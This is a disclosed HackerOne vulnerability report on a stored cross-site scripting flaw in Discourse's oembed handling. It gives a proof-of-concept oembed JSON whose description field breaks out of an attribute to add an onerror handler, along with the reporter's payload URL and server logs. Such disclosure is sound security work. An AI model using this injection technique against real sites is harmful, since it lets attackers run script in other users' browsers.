# Stored XSS in posts because of absence of oembed variables values escaping

## Report Details
- **Report ID**: 197914
- **URL**: https://hackerone.com/reports/197914
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-01-12T19:24:00.373Z
- **Disclosed**: 2017-01-20T23:50:01.965Z

## Reporter
- **Username**: skavans
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: discourse

## Vulnerability Information
Hello!

**Steps to reproduce:**
1. Paste this payload URL in the post: http://89.223.28.48/oembed_video.html?uncache
2. Save the post and you will see the XSS will fire.

{F151922}

The vulnerability exists because of absence of oembed variables values escaping.
There is the oembed link in the payload page:

```html
<link type='application/json+oembed' href='http://89.223.28.48/oembed.json'>
```
As you can see the onebox parser goes to this oembed URL to get the data:
```
64.71.168.198 - - [12/Jan/2017:19:13:52 +0000] "GET /oembed_video.html HTTP/1.1" 200 388 "-" "Ruby"
64.71.168.198 - - [12/Jan/2017:19:13:52 +0000] "GET /oembed.json HTTP/1.1" 200 389 "-" "Ruby"
```
The content of *oembed.json* is:
```json
{
        "type": "image",
        "image": "xss",
        "description": "descr' onerror='alert(/XSS by skavans/)",
        "image_width": 1,
        "image_height": 1
}
```

So the unescaped data is injected in the raw HTML at [this line](https://github.com/discourse/onebox/blob/master/lib/onebox/engine/whitelisted_generic_onebox.rb#L284) of generic_whitelisted onebox engine that leads to XSS vulnerability.

The example post with stored XSS inside is: https://try.discourse.org/t/this-is-just-one-test/632

Please let me know if you need some extra information to locate and fix the bug.

## Attachments
- ______________2017-01-12___22.17.11.png
